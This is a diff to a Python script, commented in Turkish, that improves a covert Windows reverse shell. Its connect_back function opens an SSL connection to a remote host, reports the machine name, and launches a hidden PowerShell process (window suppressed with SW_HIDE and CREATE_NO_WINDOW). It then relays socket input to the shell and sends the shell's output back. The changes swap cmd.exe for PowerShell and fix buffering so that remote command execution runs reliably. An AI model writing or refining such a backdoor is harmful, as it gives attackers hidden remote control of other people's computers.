@@ -3,18 +3,17 @@ import ssl
 import subprocess
 import threading
 import os
+import sys
 
-def pipe_stream(source, destination):
+def handle_outputs(proc_stream, ssl_socket):
+    """Sürecin çıktılarını (stdout/stderr) okur ve anında sokete basar."""
     while True:
         try:
-            data = source.read(1024) if hasattr(source, 'read') else source.recv(1024)
-            if not data:
+            # Satır satır okuma yaparak tamponlama kilidini kırıyoruz
+            line = proc_stream.readline()
+            if not line:
                 break
-            if hasattr(destination, 'write'):
-                destination.write(data)
-                destination.flush()
-            else:
-                destination.send(data)
+            ssl_socket.send(line)
         except:
             break
 
@@ -33,40 +32,45 @@ def connect_back():
         ssls.connect((h, p))
         
         computer_name = os.environ.get("COMPUTERNAME", "PC")
-        ssls.send(f"--- Interaktif Oturum Basladi: {computer_name} ---\n".encode())
+        ssls.send(f"--- Interaktif Oturum Basladi: {computer_name} ---\nPS> ".encode())
         
-        # Windows pencere gizleme ayarları
+        # Windows penceresini tamamen görünmez kılma bayrakları
         si = subprocess.STARTUPINFO()
         si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        si.wShowWindow = 0  # SW_HIDE: Pencereyi tamamen gizler
+        si.wShowWindow = 0
         
-        # Süreç gizleme bayrakları ile cmd.exe başlatılıyor
+        # CMD yerine PowerShell kullanarak girdi/çıktı senkronizasyonunu garantiye alıyoruz
         proc = subprocess.Popen(
-            ['cmd.exe'],
+            ['powershell.exe', '-NoExit', '-Command', '-'],
             startupinfo=si,
             creationflags=subprocess.CREATE_NO_WINDOW,
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            bufsize=0
+            bufsize=0 # Tamponlamayı sıfırlıyoruz
         )
         
-        t1 = threading.Thread(target=pipe_stream, args=(ssls, proc.stdin))
-        t2 = threading.Thread(target=pipe_stream, args=(proc.stdout, ssls))
-        t3 = threading.Thread(target=pipe_stream, args=(proc.stderr, ssls))
-        
+        # Çıktıları izlemek için thread'leri başlatıyoruz
+        t1 = threading.Thread(target=handle_outputs, args=(proc.stdout, ssls))
+        t2 = threading.Thread(target=handle_outputs, args=(proc.stderr, ssls))
+        t1.daemon = True
+        t2.daemon = True
         t1.start()
         t2.start()
-        t3.start()
         
-        proc.wait()
+        # Soketten gelen girdileri sürece aktarma
+        while True:
+            data = ssls.recv(1024)
+            if not data:
+                break
+            proc.stdin.write(data)
+            proc.stdin.flush() # Veriyi Windows'a zorla ittiriyoruz
+            
     except:
         pass
     finally:
-        try:
-            s.close()
-        except:
-            pass
+        try: s.close()
+        except: pass
 
 if __name__ == "__main__":
     connect_back()
